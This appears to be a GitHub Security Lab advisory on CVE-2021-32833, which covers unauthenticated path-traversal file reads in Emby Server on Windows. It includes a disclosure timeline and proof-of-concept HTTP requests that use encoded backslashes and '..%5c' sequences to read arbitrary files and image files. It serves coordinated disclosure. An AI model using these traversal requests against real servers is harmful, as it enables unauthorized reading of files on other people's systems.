<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">August 12, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2021-051: Unauthenticated file read in Emby Server - CVE-2021-32833</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/jarlob">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/26652396?s=35" height="35" width="35">
        <span>Jaroslav Lobacevski</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      
<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>2021-03-19: Issue reported to maintainers.</li>
  <li>2021-03-30: Report acknowledged.</li>
  <li>2021-05-19: Emby 4.6.0.50 is released.</li>
  <li>2021-05-25: Emby 4.6.1.0 is released.</li>
  <li>2021-06-18: Emby 4.6.3.0 is released.</li>
  <li>2021-07-01: Emby 4.6.4.0 is released.</li>
  <li>2021-07-20: Asked for the status update. No response.</li>
  <li>2021-07-28: Verified that the issue is not fixed.</li>
  <li>2021-07-28: Asked for the status update. No response.</li>
  <li>2021-08-12: Published as per our <a href="https://securitylab.github.com/advisories/#policy">disclosure policy</a>.</li>
</ul>

<h2 id="summary">Summary</h2>

<p>Emby Server allows unauthenticated file read.</p>

<h2 id="product">Product</h2>

<p>Emby Server</p>

<h2 id="tested-version">Tested Version</h2>

<p>4.5.4.0</p>

<h2 id="details">Details</h2>

<h3 id="issue-1-arbitrary-file-read-in-videosidhlsplaylistidsegmentidsegmentcontainer">Issue 1: Arbitrary file read in <code class="language-plaintext highlighter-rouge">/Videos/Id/hls/PlaylistId/SegmentId.SegmentContainer</code></h3>

<p>The <code class="language-plaintext highlighter-rouge">/Videos/{Id}/hls/{PlaylistId}/{SegmentId}.{SegmentContainer}</code> route allows arbitrary file read on Windows. It is possible to set the <code class="language-plaintext highlighter-rouge">{SegmentId}.{SegmentContainer}</code> part of the route to an absolute path using the Windows path separator <code class="language-plaintext highlighter-rouge">\</code> (<code class="language-plaintext highlighter-rouge">%5C</code> when URL encoded).</p>

<p>The <code class="language-plaintext highlighter-rouge">PlaylistId</code> doesn’t matter, but a prerequisite is a knowledge of the <code class="language-plaintext highlighter-rouge">Id</code> - a GUID of an existing media file. The <code class="language-plaintext highlighter-rouge">Id</code> can be leaked by any authenticated user as it is exposed in server responses:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /emby/Users/713ef0671a6b4db6a8448adada1991c1/Items/456?X-Emby-Client=Emby%20Web&amp;X-Emby-Device-Name=Firefox&amp;X-Emby-Device-Id=6651e02e-efbc-40e9-9f50-1f75a8b946ad&amp;X-Emby-Client-Version=4.5.4.0&amp;X-Emby-Token=1ecaef5693a34fe28966e53b7646977a HTTP/1.1

HTTP/1.1 200 OK
...

{
..
  "PresentationUniqueKey": "43b57ac0ca1b200ba97913412bd7a85f",
  "Container": "mkv",
...
  ],
  "MediaSources": [
    {
      "Protocol": "File",
      "Id": "43b57ac0ca1b200ba97913412bd7a85f",
...
</code></pre></div></div>

<p>PoC:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /Videos/43b57ac0-ca1b-200b-a979-13412bd7a85f/hls/anything/C:%5Ctemp%5Ctest.txt HTTP/1.1
</code></pre></div></div>

<h4 id="impact">Impact</h4>

<p>This issue may lead to unauthorized access to the system especially when Emby Server is configured to be accessible from the Internet.</p>

<h3 id="issue-2-unauthenticated-arbitrary-image-file-read-in-imagesratingsthemename-and-imagesmediainfothemename">Issue 2: Unauthenticated arbitrary image file read in <code class="language-plaintext highlighter-rouge">/Images/Ratings/theme/name</code> and <code class="language-plaintext highlighter-rouge">/Images/MediaInfo/theme/name</code></h3>

<p>Both the <code class="language-plaintext highlighter-rouge">/Images/Ratings/{theme}/{name}</code> and <code class="language-plaintext highlighter-rouge">/Images/MediaInfo/{theme}/{name}</code> routes allow unauthenticated arbitrary <em>image</em> file read on Windows. It is possible to set the <code class="language-plaintext highlighter-rouge">{theme} or </code>{name}<code class="language-plaintext highlighter-rouge"> part of the route to a relative or absolute path using the Windows path separator </code>` (<code class="language-plaintext highlighter-rouge">%5C</code> when URL encoded). The route automatically appends the following allowed extensions, so it is only possible to read image files: <code class="language-plaintext highlighter-rouge">.png</code>, <code class="language-plaintext highlighter-rouge">.jpg</code>, <code class="language-plaintext highlighter-rouge">.jpeg</code>, <code class="language-plaintext highlighter-rouge">.tbn</code>, <code class="language-plaintext highlighter-rouge">.gif</code>.</p>

<p>PoCs to download <code class="language-plaintext highlighter-rouge">c:\temp\filename.jpg</code>:</p>

<p><code class="language-plaintext highlighter-rouge">GET /Images/Ratings/c:%5ctemp/filename HTTP/1.1</code></p>

<p><code class="language-plaintext highlighter-rouge">GET /Images/Ratings/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5ctemp/filename HTTP/1.1</code></p>

<h4 id="impact-1">Impact</h4>

<p>This issue may lead to unauthorized access to the system especially when Emby Server is configured to be accessible from the Internet.</p>

<h2 id="cve">CVE</h2>

<p>CVE-2021-32833</p>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/JarLob">@JarLob (Jaroslav Lobačevski)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2021-051</code> in any communication regarding this issue.</p>


 